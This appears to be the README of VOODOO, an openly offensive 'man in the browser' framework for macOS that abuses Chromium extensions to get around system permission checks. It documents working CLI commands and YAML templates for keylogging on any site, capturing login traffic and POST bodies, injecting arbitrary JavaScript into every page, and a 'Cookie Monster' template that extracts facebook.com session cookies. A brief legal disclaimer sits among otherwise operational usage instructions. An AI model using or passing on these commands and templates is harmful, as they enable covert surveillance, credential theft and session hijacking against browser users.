# VOODOO
VOODOO is a Man in the browser attack framework for macOS.
It comes with built-in keylogging, traffic monitoring, and scripting capabilities.
VOODOO is highly extendable & shareable, it can execute `YAML` templates that define complex attacks.

<p align="center">
    <br />
    <img src="./.github/voodoo.svg" width="50%" />
</p>

## Browser Support

| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="IE / Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/opera/opera_48x48.png" alt="Opera" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Opera | [<img src="https://github.com/alrra/browser-logos/raw/main/src/brave/brave_48x48.png" alt="Brave" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Brave | [<img src="https://github.com/alrra/browser-logos/raw/main/src/chromium/chromium_48x48.png" alt="Chromium" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chromium |
| --------- | --------- | --------- | --------- | --------- |
| macOS only | macOS only | macOS only | macOS only | macOS only

## Demo
[![VOODOO](https://img.youtube.com/vi/4wTpdh06H_o/0.jpg?s)](https://www.youtube.com/watch?v=4wTpdh06H_o)

## Why?
In macOS traffic interception and keyloggers usually require TCC permissions, VOODOO bypass all of this by exploiting chromium based browsers extensions.
**VOODOO does not require root privileges or any TCC permissions to work.**

## Legal Disclaimer
Usage of this code for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Features
* 📜 Content Scripts - inject arbitrary JavaScript to any page
* 🔍 Interceptor - capture browser traffic (url, headers, body, etc)
* 🔑 Keylogger - records user keystrokes on any site
* 📋 VOODOO Templates - run advance man in the browser attacks from template files

## Requirements
* ruby >= 2.0.0
* rubygems >= 1.8
* thor ~> 1.2.1
* bundler >= 1.17

## Installation
```sh
$: gem install get-voodoo
```

## Building
```sh
$: git clone https://github.com/breakpointHQ/VOODOO.git
$: cd ./VOODOO
$: gem build ./voodoo.gemspec
$: gem install ./get-voodoo-X.X.X.gem
```

Make sure you have `/Users/[user]/.gem/ruby/[version]/bin` in your `PATH`.

## CLI

```sh
$: voodoo
Commands:
  voodoo help [COMMAND]    # Describe available commands or one specific command
  voodoo intercept         # Intercept browser requests
  voodoo keylogger         # Records user keystrokes
  voodoo script <js/path>  # Add a content script
  voodoo template <path>   # Execute a VOODOO template
  voodoo version           # Prints voodoo version
```

## Adding content script

```sh
$: voodoo help script
Usage:
  voodoo script <js/path>

Options:
  x, [--urls=one two three]         
  f, [--format=FORMAT]              # pretty, json, payload, none
                                    # Default: pretty
  o, [--output=OUTPUT]              # File path
  p, [--params=key:value]           
  m, [--matches=one two three]      
                                    # Default: ["*://*/*"]
  b, [--browser=BROWSER]            
                                    # Default: chrome
  p, [--permissions=one two three]  
      [--max-events=N]              

Add a content script
```

Execute JS on every page loaded on the Opera browser.
```sh
$: voodoo script "alert('Hello VOODOO!');" -b opera
```

Execute JS on every page matches `https://example.com/*`
```sh
$: voodoo script "alert('Example VOODOO!');" -b chrome -m "https://example.com/*"
```

Execute JS on every page loaded on Google Chrome, and open `https://example.com`.
```js
$: voodoo script /tmp/myjs.js -b chrome -x "https://example.com"
```

## Intercept browser traffic

```sh
$: voodoo help intercept
Usage:
  voodoo intercept

Options:
  u, [--url-include=URL_INCLUDE]      
  i, [--body-include=BODY_INCLUDE]    
  h, [--header-exists=HEADER_EXISTS]  
  f, [--format=FORMAT]                # pretty, json, payload
                                      # Default: pretty
  o, [--output=OUTPUT]                # File path
  x, [--urls=one two three]           
  m, [--matches=one two three]        
                                      # Default: ["<all_urls>"]
  b, [--browser=BROWSER]              
                                      # Default: chrome
      [--max-events=N]                

Intercept browser requests
```

Intercept all requests
```sh
$: voodoo intercept -o /tmp/requests_log.txt
```

Intercept all requests from Opera browser only when the url include `/login`.
```sh
$: voodoo intercept -o /tmp/requests_log.txt --url-include "/login"
```

Intercept all requests when the post body include `@`.
```sh
$: voodoo intercept -o /tmp/requests_log.txt --body-include "@"
```

Intercept all requests when the url matches `https://example.com/*` or `https://example.net/*`
```sh
$: voodoo intercept -m "https://example.com/*" "https://example.net/*"
```

## Keylogger
```sh
$: voodoo help keylogger
Usage:
  voodoo keylogger

Options:
  x, [--urls=one two three]     
  f, [--format=FORMAT]          # pretty, json, payload
                                # Default: pretty
  o, [--output=OUTPUT]          # File path
  m, [--matches=one two three]  
                                # Default: ["*://*/*"]
  b, [--browser=BROWSER]        
                                # Default: chrome
      [--max-events=N]          

Records user keystrokes
```

Record user keys only when the url matches `https://example.com/*`
```sh
$: voodoo keylogger -m "https://example.com/*"
```

## Templates

A VOODOO template is a `YAML` file that is used to define a man in the browser attack.

```sh
$: voodoo help template
Usage:
  voodoo template <path>

Options:
  b, [--browser=BROWSER]     
  f, [--format=FORMAT]       # json, payload, none
                             # Default: none
  o, [--output=OUTPUT]       # File path
  x, [--urls=one two three]  
  p, [--params=key:value]    
      [--max-events=N]       

Execute a VOODOO template
```

A template must have have 3 main blocks: `info`, `scripts`, and `browser` and 2 optional settings `format` and `permissions`.

### Information

The `info` block holds important information about your template. Info block provides `name`, `author`, and `description`.
`info` block also supports dynamic fields, so you can define any key: value blocks to provide more useful information about the template.

Info block example:
```yaml
info:
  name: Change the Title of example.com
  author: Mr. Test
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
```

### Scripts
The `scripts` block define the content scripts and background scripts that will be injected to the browser.
You can spesify the following attributes for each script:

| Name      | Type      | Description |
| --------- | --------- | --------- | 
`matches` | array of strings | Specifies which pages this content script will be injected into. |
`content` | string | Specifies the JavaScript code that will be executed
`file` | string | Specifies the path to a JavaScript file that will be executed
`background` | boolean | Specifies whether or not this is a background script

### Scripts block examples:

Inject a content script from a file to every page
```yaml
scripts:
  - matches: "*://*/*" # Inject to every page
    file: ./keylogger.js # A JS file from the same folder as the template file
```

Overwrite the title of example.com and example.net
```yaml
scripts:
  - matches:
      - https://example.com/*
      - https://example.net/*
    content: document.querySelector('h1').innerText = 'VOODOO Example!';
```

Inject a background script that will report back on every tab update.
```yaml
scripts:
  - content: chrome.tabs.onUpdated.addListener((_,tab) => VOODOO.send(tab));
    background: true
```

A template file looks like this:

```yaml
info:
  name: Change the Title of example.com
  author: Mr. Test
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.

scripts:
  - matches: https://example.com/*
    content: document.querySelector('h1').innerText = "VOODOO Example";

browser:
  name: opera
  urls:
    - https://example.net/
    - https://example.com/
```

### JavaScript API
Every content script and background script can access the `VOODOO` object.

`VOODOO.send(:any)` is a method that allows you to send information back to the CLI/Ruby.
When using `VOODOO.send` make sure the `format` is not `none`.

### Permissions
The `permissions` property is used to declare the necessary permissions for your VOODOO script.
By default VOODOO sets the following permissions:
`tabs`, `*://*/*`, `webRequest`

Adding the `cookies` permission, to extract `facebook.com` cookies from the browser.
```yaml
info:
  name: Cookie Monster

format: payload

permissions:
  - cookies

scripts:
  - content: |
      chrome.cookies.getAll({domain: "facebook.com"}, VOODOO.send);
    background: true
```

### Browser
The `browser` block is a key value object that defines browser related settings for the template.
Please note, the `name` setting can be overwrited using the `--browser` or `-b` CLI option.
The `urls` setting can also be overwrited using the `--urls` or `-x` CLI options.

| Name      | Type      | Description | Default | 
| --------- | --------- | --------- | --------- |
| name      | string    | supported browser short name `chrome`, `opera`, `edge`, `brave`, `chromium` | `chrome`
| urls      | array of strings | list of urls to open right after we hijack the browser. | `NULL`

### Format
The `format` property sets the default output format for the template.
Please note, this setting can be overwrited using the `--format` or `-f` CLI option.

```yaml
info:
  name: Title Spy
  description: Extract the title from any https site the user visits

format: payload

scripts:
  - matches: https://*/*
    content: 'VOODOO.send({title: document.title})'

browser:
  name: opera
```

## Ruby API

The underline Ruby API can also be used for advance integrations.

```rb
require 'voodoo'

browser = VOODOO::Browser.Chrome
                       # .Opera
                       # .Edge
                       # .Chromium

# Execute JS on example.com
browser.add_script(content: 'alert("VOODOO Example!");',
                   matches: 'https://example.com/*')

# Intercept all browser requests
browser.intercept do |event|
    req = event[:payload]
    puts "#{req[:method]} #{req[:url]}"
end

# Inject a keylogger to every page
browser.keylogger do |event|
    print event[:payload][:log]
end

# hijack the browser, and open example.com
browser.hijack 'https://example.com'
```

## Development

Running project tests
```sh
$: bundle exec rake test
```

## Contributing
* File an issue first prior to submitting a PR!
* If applicable, submit a test suite against your PR

## TO DO
* Windows/Linux support
* Ruby API documentation
